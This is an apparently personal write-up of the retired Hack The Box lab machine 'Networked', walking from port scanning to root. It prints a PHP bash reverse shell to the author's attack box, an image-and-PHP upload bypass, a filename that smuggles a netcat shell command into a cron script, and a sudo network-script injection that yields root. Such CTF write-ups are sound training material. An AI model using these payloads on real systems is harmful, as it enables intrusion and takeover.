# Title: Networked
Date: 2019-10-28

I did this box when it was still live, and it is definitely the most challenging of this series so far. 

## Enumeration

Step 1, a port scan:

	$ nmap -sC -sV -oA nmap-scripts networked
	Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-20 14:16 CDT
	Nmap scan report for networked (10.10.10.146)
	Host is up (0.64s latency).
	Not shown: 997 filtered ports
	PORT    STATE  SERVICE VERSION
	22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
	| ssh-hostkey: 
	|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
	|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
	|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
	80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
	|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
	|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
	443/tcp closed https
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 86.52 seconds

After that I pulled up the website and viewed the source:

	<html>
	<body>
	Hello mate, we're building the new FaceMash!</br>
	Help by funding us and be the new Tyler&Cameron!</br>
	Join us at the pool party this Sat to get a glimpse
	<!-- upload and gallery not yet linked -->
	</body>
	</html>

I ran __dirb__ with default scan:

	$ dirb http://networked

	-----------------
	DIRB v2.22    
	By The Dark Raver
	-----------------
	
	START_TIME: Sun Oct 20 16:33:04 2019
	URL_BASE: http://networked/
	WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
	
	-----------------
	
	GENERATED WORDS: 4612                                                          
	
	---- Scanning URL: http://networked/ ----
	==> DIRECTORY: http://networked/backup/                                        
	+ http://networked/cgi-bin/ (CODE:403|SIZE:210)                                
	+ http://networked/index.php (CODE:200|SIZE:229)                               
	==> DIRECTORY: http://networked/uploads/                                       
	                                                                               
	---- Entering directory: http://networked/backup/ ----
	(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
	    (Use mode '-w' if you want to scan it anyway)
	                                                                               
	---- Entering directory: http://networked/uploads/ ----
	+ http://networked/uploads/index.html (CODE:200|SIZE:2)                        
	                                                                               
	-----------------
	END_TIME: Sun Oct 20 16:38:49 2019
	DOWNLOADED: 9224 - FOUND: 3

In the backup directory there was a tarball containing the php files that make up this site. Looking over the code it seemed like a php reverse shell payload could be uploaded to get a foothold.

# Foot in the Door

It took some experimentation to get it right. Thee upload script did some checks to ensure the file was in fact an image. I had to get a file past those checks that would be handled as a php script by the server. 

I tried a few shells, but this was the one I settled on:

	<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.x.x/5555 0>&1'");

The 10.10.x.x IP was my Kali attack box, and 5555 is the port I used for the shell. This php code, when run by the server would reach out to that IP, and connect to netcat which I had listening on port 5555. 

	$ nc -lvp 5555

I also needed as small image so I chose a little blue bird:

<img src="https://raw.githubusercontent.com/chadpierce/htb/master/networked/birb.jpg" alt="birb" width="400"/>

I tried inserting the shellcode into the exif data of the jpeg but this wasn't working. I then tried something even more simple that worked perfectly. I just combined the 2 files with __cat__, and named it php.jpg. The thinking was that the jpg extension and the fact that this _was_ an image would be enough to get past the upload script's checks, and the .php part of the file name would be enough to make the server interpret the file as PHP (which would launch my reverse shell).

	cat birb.jpg exploit.php > birb.php.jpg

Here's what this looked like on my attack box:

	$ ncat -lkv 5555
	Ncat: Version 7.80 ( https://nmap.org/ncat )
	Ncat: Listening on :::5555
	Ncat: Listening on 0.0.0.0:5555
	Ncat: Connection from 10.10.10.146.
	Ncat: Connection from 10.10.10.146:58216.
	bash: no job control in this shell
	bash-4.2$ ls
	ls
	10_10_14_23.jpg
	10_10_14_23.php.jpg
	127_0_0_1.png
	127_0_0_2.png
	127_0_0_3.png
	127_0_0_4.png
	index.html
	bash-4.2$ 
	
	bash-4.2$ whoami
	whoami
	apache
	bash-4.2$ 

I got a shell as the "apache" user. 

# Getting a real user

Now that I had a shell I needed to get a user account shell. 

This step took me quite a while. After I got the apache web shell I took a break and came back the next day. Screwed around for a bit and came back the day after that. I was pretty stumped. I ended up getting pretty frustrated. 

Basically, I knew what file I needed to use, I just couldn't figure out what to do with it. It was a script in the "guly" user directory called "check_attack.php" that was being launched as a cron job every 3 minutes. The script looped through all of the files in the upload directory looking for files that didn't meet the filename requirements defined in the code. 

After a while I started perusing the HTB forums and found this link:

	https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

It is a good read in generalm but it led me down the right path. I knew I needed to use this line of the script in the user directory:

	exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
	
I don't like looking at the forums to hints, but I had spent too much time fiddling around with no progress. I won't say that the wildcard writeup gave it away, but it put me in the right mindset. One reason this line stuck out was because the script cycled through the files in the uploads directory, and I could now put files in that directory with my apache shell. 

The trick was to use a semicolon (;) to run a second command.  I touched a file in the uploads directory. It didn't need any contents - the name itself did the work. 

	touch "123.php; nc 10.10.14.23 6666 -c sh"

I did spent a fair amount of time trying to get the "-e /bin/sh" switch working but it is impossible (?) to get a filename with slashes in it. In Unix slash is hardcoded in the kernel and you just can't do that. I knew that the "-c" switch existed but it took me a while to think of using it. 

	bash-4.2$ touch "123.php; nc 10.10.x.x 6666 -c sh"
	bash-4.2$ ls
	ls
	10_10_14_23.php.jpg
	123.php; nc 10.10.x.x 6666 -c sh
	127_0_0_1.png
	127_0_0_2.png
	127_0_0_3.png
	127_0_0_4.png
	bash-4.2$ 

I ran a listener on another shell on port 6666. Within that 3 minute timeframe I got a shell as the "guly" user. 

	$ nc -l 6666
	ls
	check_attack.php
	crontab.guly
	user.txt
	whoami
	guly

## Root

I did some more enumeration once I got the guly shell. The first thing that really looked significant was this:

	sudo -l
	Matching Defaults entries for guly on networked:
	    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
	
	User guly may run the following commands on networked:
	    (root) NOPASSWD: /usr/local/sbin/changename.sh
	
guly could run a shell script called "changename.sh", which is here:

	less /usr/local/sbin/changename.sh
	#!/bin/bash -p
	cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
	DEVICE=guly0
	ONBOOT=no
	NM_CONTROLLED=no
	EoF
	
	regexp="^[a-zA-Z0-9_\ /-]+$"
	
	for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
		echo "interface $var:"
		read x
		while [[ ! $x =~ $regexp ]]; do
			echo "wrong input, try again"
			echo "interface $var:"
			read x
		done
		echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
	done
	  
	/sbin/ifup guly0

And the contents of the "ifcfg-guly" script are here:

	/etc/sysconfig/network-scripts
	less ifcfg-guly
	DEVICE=guly0
	ONBOOT=no
	NM_CONTROLLED=no
	NAME=ps /tmp/foo
	PROXY_METHOD=asodih
	BROWSER_ONLY=asdoih
	BOOTPROTO=asdoih

I ran the script with sudo and assume I had to do something with the inputs to exploit something there. I spent quite a bit of time playing around with this. Enumerating more and more. I took a break and came back the following day to work at this one more. 

In the end I started just manually fuzzing the inputs in the changename script and got root. I made tons of attempts before something landed root. This ended up being it:

	sudo /usr/local/sbin/changename.sh
	interface NAME:
	asdf /bin/bash
	interface PROXY_METHOD:
	asdf /bin/bash
	interface BROWSER_ONLY:
	asfd /bin/bash
	interface BOOTPROTO:
	asdf /bin/bash
	whoami
	root
